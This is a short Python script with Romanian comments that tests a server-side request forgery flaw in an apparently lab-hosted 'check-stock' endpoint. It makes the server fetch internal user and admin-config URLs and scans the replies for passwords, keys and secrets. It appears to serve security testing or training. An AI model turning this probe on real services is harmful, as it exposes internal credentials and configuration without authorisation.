import requests

# Endpoint-ul vulnerabil SSRF
SSRF_URL = "http://backend:8080/api/stores/check-stock"

# URL-uri interne care nu ar trebui să fie accesibile
INTERNAL_URLS = [
    "http://backend:8080/api/bac/users",     # URL care ar trebui să conțină "user"
    "http://backend:8080/api/bac/admin/config", # URL care ar trebui să conțină "config"
]

def test_ssrf():
    print("[🔍] Testare SSRF...")

    # Lista de termeni de verificat în răspuns
    sensitive_keywords = [
        "user", "username", "pass", "password", "role", "debug", 
        "key", "encryption", "encryptonkey", "database", "secret"
    ]

    for url in INTERNAL_URLS:
        payload = {"url": url}
        response = requests.post(SSRF_URL, json=payload)

        if response.status_code == 200:
            data = response.text  # Răspunsul serverului
            # Verificăm dacă răspunsul conține unul dintre termenii sensibili
            if any(keyword in data for keyword in sensitive_keywords):
                print(f"[✔] Posibil SSRF! {url} a returnat:\n{data[:500]}...\n")
            else:
                print(f"[✖] Nu s-au găsit date sensibile la {url}. Răspunsul:\n{data[:500]}...\n")
        else:
            print(f"[❌] Cererea către {url} a eșuat cu status {response.status_code}")

    print("[🔥] Testarea SSRF s-a încheiat.")

if __name__ == "__main__":
    test_ssrf()
